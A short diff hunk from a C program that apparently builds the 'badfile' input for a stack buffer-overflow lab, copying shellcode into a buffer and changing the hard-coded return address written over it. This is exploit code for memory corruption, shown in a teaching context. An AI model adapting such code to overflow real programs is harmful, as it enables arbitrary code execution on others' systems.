@@ -33,7 +33,7 @@ void main(int argc, char **argv)
 	   *(long *) &buffer[X] = addr; */
 
 	memcpy(&buffer[400], shellcode, sizeof(shellcode));
-	*(long*) &buffer[24] = 0xbffff090 + 390; // &buffer
+	*(long*) &buffer[24] = 0xbffffb54 + 300; // &buffer
 	/* Save the contents to the file "badfile" */
 	badfile = fopen("./badfile", "w");
 	fwrite(buffer, sizeof(buffer), 1, badfile);
